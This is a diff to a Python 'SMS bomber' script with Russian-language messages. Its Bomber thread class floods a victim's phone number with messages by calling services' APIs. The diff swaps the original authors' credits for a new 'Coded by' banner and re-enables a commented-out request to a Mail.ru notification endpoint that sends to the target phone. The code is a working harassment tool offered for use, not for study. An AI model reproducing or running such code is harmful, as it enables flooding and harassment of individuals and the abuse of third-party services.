@@ -1,9 +1,9 @@
+#!/usr/bin/ python
+#!coding:utf-8
 import requests, random, datetime, sys, time, argparse, os
 from colorama import Fore, Back, Style
 from threading import Thread
 
-# На строке 273 нужно убрать "#" если вы из России, 
-# посколько второй соавтор из Украины не все сервисы работают как должны в частности Mail.ru 
 
 
 class Bomber(Thread):
@@ -15,15 +15,7 @@ class Bomber(Thread):
         banner = """
  _____________________________________________________________
 |                                                            |
-| [--] Name: SMSomer-multi                                   |
-|                                                            |
-| [--] Have Services: 51(end unlimited amount of processes)  |
-|                                                            |
-| [--] Created by: @shabakoff and finalized by @LORD_GL      |
-|                                                            |
-| [--] Telegram channel: @codingbots and @overlamer1         |
-|                                                            |
-| [--] Version: 2.0.1                                        |
+|           Coded by @fsocietyD                              |
 |____________________________________________________________|
 """
         print(banner)
@@ -274,7 +266,7 @@ class Bomber(Thread):
                 print('[-] Не отправлено! (Lenta)')
 
             try:
-                 #requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
+                requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
                 print('[+] Mail.ru не отправлено!')
             except:
                 print('[-] Не отправлено! (Mail.ru)')
